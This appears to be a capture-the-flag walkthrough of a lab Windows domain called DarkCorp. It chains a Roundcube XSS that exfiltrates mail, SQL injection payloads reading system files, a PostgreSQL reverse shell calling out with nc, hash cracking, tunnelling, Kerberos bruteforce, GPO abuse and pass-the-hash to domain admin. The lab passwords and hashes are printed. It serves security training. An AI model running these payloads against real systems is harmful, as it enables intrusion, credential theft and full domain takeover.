## Overview

DarkCorp is a multi-layered Windows domain penetration test involving initial web vulnerabilities including Roundcube Webmail XSS (CVE-2024–42008), SQL Injection on an internal service to extract Linux credentials, lateral movement via SSH and VPN tunneling, Active Directory enumeration, Kerberos bruteforce, Group Policy Object (GPO) abuse for privilege escalation, and finally domain compromise with flag capture.

## 1\. Reconnaissance and Initial Enumeration

## Port Scanning

Perform a fast scan using RustScan to identify open services on the target IP (replace 10.10.11.54 with the actual target IP if needed):

```plaintext
rustscan -a 10.10.11.54 -sCTV -Pn
```

Confirm with Nmap:

```plaintext
nmap -p22,80 -sC -sV -Pn 10.10.11.54
```

Output showed filtered ports 22 (SSH) and 80 (HTTP) on target.

## DNS and Hostname Setup

Add the domain names associated with the target IP to `/etc/hosts` to access the services by hostname:

```plaintext
echo "10.10.11.54 drip.htb mail.drip.htb" | sudo tee -a /etc/hosts
```

Attempt accessing `http://drip.htb` and `http://mail.drip.htb` for initial reconnaissance.

## 2\. Roundcube Webmail Enumeration and 0-Click XSS Exploit

## Register and Log in

Register a new user on Roundcube Webmail at [`http://mail.drip.htb/`.](http://mail.drip.htb/.)

Logged in as `test@drip.htb`.

## Intercept Contact Form

Use BurpSuite to intercept POST requests to `/contact`.

The form sends emails which can be controlled.

Vulnerability:  
Roundcube v1.6.7 is vulnerable to a 0-click XSS triggered by crafted email content (CVE-2024–42008).

Leverage this to execute JavaScript in victim’s mailbox (`bcase@drip.htb`).

## Exploitation Script

Modify the provided Python script to send a malicious email with payload exfiltrating private email content via the attacker’s HTTP server:

```plaintext
python3 xss.py -m <message_id> -i <YourIP> -p 4243
```

Start a local listener to capture the exfiltrated base64 encoded email content:

```plaintext
rlwrap nc -lnvp 4243
```

## 3\. Collect Password Reset Token and Access Dashboard

## Reading Emails

Fetch sensitive emails (`_uid` param controls message).

After exploiting XSS, extract reset tokens from password reset emails.

Add the internal dashboard domain and reset bcase password:

```plaintext
echo "10.10.11.54 dev-a3f1-01.drip.htb" | sudo tee -a /etc/hosts
```

Update bcase’s password via read reset token URL.

Log into dashboard at [`http://dev-a3f1-01.drip.htb/`.](http://dev-a3f1-01.drip.htb/.)

## 4\. SQL Injection in Analytics Portal — Extract Linux Credentials

## Exploit SQL Injection

On the dashboard’s `/analytics` page, a search parameter is injectable.

Use SQLi payloads to extract files:

```plaintext
' UNION SELECT pg_read_file('/etc/passwd', 0, 2000) --
' UNION SELECT pg_read_file('/etc/hosts', 0, 2000) --
```

Extract Linux user hashes and other files.

Extracted PostgreSQL log file reveals user `ebelford`’s MD5 hash:

```plaintext
8bbd7f88841b4223ae63c8848969be86
```

Crack hash online (CrackStation or similar) to get password `ThePlague61780`.

## 5\. SSH to Linux Machine as User ebelford

```plaintext
sshpass -p'ThePlague61780' ssh -o StrictHostKeyChecking=no ebelford@drip.htb
```

## 6\. Privilege Escalation on Linux to PostgreSQL User

Locate Dashboard `.env` containing DB creds:

```plaintext
cat /var/www/html/dashboard/.env
# Contains: DB_USERNAME=dripmail_dba, DB_PASS=2Qa2SsBkQvsc
```

Reverse Shell via PostgreSQL:

```plaintext
rlwrap nc -lnvp 4242
PGPASSWORD=2Qa2SsBkQvsc psql -h localhost -U dripmail_dba -d dripmail -c "COPY (SELECT '') TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc <YourIP> 4242 >/tmp/f'"
```

Add SSH key and login as postgres:

```plaintext
mkdir -p ~/.ssh && echo "ssh-ed25519 AAAA...user-key..." > ~/.ssh/authorized_keys
ssh postgres@drip.htb
```

## 7\. Extract More Credentials from Backups

Locate encrypted PostgreSQL backup:

```plaintext
ls -la /var/backups/postgres/
```

Decrypt backup with DB password:

```plaintext
gpg --homedir /var/lib/postgresql/.gnupg --pinentry-mode=loopback --passphrase '2Qa2SsBkQvsc' --decrypt /var/backups/postgres/dev-dripmail.old.sql.gpg > dev-dripmail.old.sql
```

Extract users and hashes from decrypted file:  
User `victor.r` with hash `cac1c7b0e7008d67b6db40c03e76b9c0`.

Crack victor.r’s password:  
`victor1gustavo@#`.

## 8\. Internal Pivot: SSHuttle VPN Tunnel into Internal Network

```plaintext
sshuttle -r ebelford:'ThePlague61780'@drip.htb -N 172.16.20.0/24
echo -e "172.16.20.1 DC-01.darkcorp.htb
172.16.20.2 WEB-01.darkcorp.htb" | sudo tee -a /etc/hosts
```

## 9\. Internal Network Enumeration and User Flag

Scan and access:

```plaintext
nmap -sC -sV -p5000 172.16.20.2
```

Port 5000 requires Basic Auth — login with victor.r credentials.

Evil-WinRM to WEB-01:

```plaintext
evil-winrm -i WEB-01.darkcorp.htb -u Administrator -H 88d84ec08dad123eb04a060a74053f21
cd Desktop
type user.txt
# You will get User flag
```

## 10\. Domain Enumeration with BloodHound through ProxyChains

Install proxychains:

```plaintext
sudo apt install proxychains4
```

Configure SOCKS5 proxy, then run BloodHound collection:

```plaintext
proxychains4 bloodhound-python -u victor.r@darkcorp.htb -p 'victor1gustavo@#' -dc dc-01.darkcorp.htb --dns-tcp -ns 172.16.20.1 --dns-timeout 10 -c ALL -d darkcorp.htb --zip
```

Reveals `taylor.b.adm` is member of `gpo_manager`.

## 11\. Bruteforce Kerberos to Get taylor.b.adm Password

Prepare wordlist (filter &gt;=7 chars):

```plaintext
def process_line(line):
    line = line.strip()
    if len(line) < 7:
        return None
    return line

with open('/usr/share/wordlists/rockyou.txt', 'r', errors='ignore') as f, open('rockyou2.txt', 'w') as out:
    for line in f:
        word = process_line(line)
        if word:
            out.write(word + '\n')
```

Use kerbrute for bruteforce:

```plaintext
sshpass -p'ThePlague61780' scp kerbrute ebelford@drip.htb:/home/ebelford
sshpass -p'ThePlague61780' scp rockyou2.txt ebelford@drip.htb:/home/ebelford
ssh ebelford@drip.htb
chmod +x kerbrute
./kerbrute bruteuser -d darkcorp.htb --dc 172.16.20.1 rockyou2.txt taylor.b.adm
# Password found: !QAZzaq1
```

## 12\. Privilege Escalation via GPO Abuse

Download PowerGPOAbuse script on attacker machine:

```plaintext
wget https://raw.githubusercontent.com/rootSySdk/PowerGPOAbuse/refs/heads/master/PowerGPOAbuse.ps1
python3 -m http.server 4243
```

On DC-01, run PowerShell commands to escalate privileges (see original instructions).

## 13\. Dump Domain Administrator Hashes

```plaintext
impacket-secretsdump darkcorp/taylor.b.adm:'!QAZzaq1'@darkcorp.htb
```

Extract Administrator NTLM hash: `fcb3ca5a19a1ccf2d14c13e8b64cde0f`.

## 14\. Final Domain Administrator Access & Root Flag

```plaintext
evil-winrm -i dc-01.darkcorp.htb -u Administrator -H fcb3ca5a19a1ccf2d14c13e8b64cde0f
cd Desktop
type root.txt
# You will get Root flag
```

## Summary of Critical Commands

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756323823877/3e55a615-8ca4-4802-831f-07839684b54f.png align="center")
